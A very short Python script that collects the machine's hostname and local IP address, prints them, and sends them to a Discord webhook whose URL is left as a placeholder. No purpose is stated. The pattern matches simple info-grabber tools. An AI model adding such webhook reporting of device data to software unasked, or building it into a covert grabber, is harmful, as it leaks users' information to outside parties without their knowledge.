import socket
from dhooks import Webhook

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
info = ' Deivce name ' + hostname + ' ' + 'Ip: ' + local_ip
print(' Deivce name ' + hostname + ' ' + 'Ip: ' + local_ip)


hook = Webhook('Your discord webhook')

hook.send(info)